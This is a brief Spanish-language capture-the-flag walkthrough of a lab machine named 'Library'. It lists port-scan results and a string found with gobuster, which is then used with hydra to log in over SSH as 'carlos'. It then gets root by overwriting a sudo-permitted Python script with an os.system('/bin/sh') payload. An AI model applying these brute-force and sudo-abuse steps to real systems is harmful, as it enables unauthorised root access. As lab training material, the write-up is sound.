# Library

*22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))*

Gobuster -> /index.html y /index.php -> *JIFGHDS87GYDFIGD* ?
hydra a ssh con password JIFGHDS87GYDFIGD
**carlos**

## Escalada

*(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py*

Cambiamos lo que tiene dentro ese archivo para poder lanzar una bash con python

En un principio nos dice que no tenemos permisos de escritura, pero como el usuario *carlos* es el propietario, nos lo damos con
`chmod u+w /opt/script.py`

A continuación metemos en el archivo:
`echo 'import os; os.system("/bin/sh");' > /opt/script.py`
Lo ejecutamos como root
`sudo -u root python3 /opt/script.py`
**root**
